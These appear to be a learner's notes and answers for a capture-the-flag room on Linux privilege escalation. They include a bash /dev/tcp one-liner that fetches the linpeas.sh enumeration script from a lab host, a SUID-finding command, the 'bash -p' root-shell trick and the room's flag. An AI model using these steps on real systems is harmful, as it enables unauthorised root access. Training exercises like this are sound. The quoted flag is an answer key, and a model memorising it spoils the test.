# Networking: The Rogue Gnome

## Notes
```
Learning Objectives:
We're going to be learning the fundamentals of privilege escalation, what it entails and how it is used day-to-day without you even realising in legitimate circumstances. After covering the fundamentals of Linux file permissions and understanding why we may want to escalate our privileges as a pentester, we're going to put our theory into practice by abusing a common file permission misconfiguration on Linux.

export RHOST=10.9.18.129
export RPORT=9999
export LFILE=linpeas.sh
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
```

## Questions
1. What type of privilege escalation involves using a user account to execute commands as an administrator?
```
vertical
```

2. What is the name of the file that contains a list of users who are a part of the sudo group?
```
sudoers
```

3. What are the contents of the file located at /root/flag.txt?
```
finding executables with SUID
find / -perm -u=s -type f 2>/dev/null
using bash as bash -p
thm{2fb10afe933296592}
```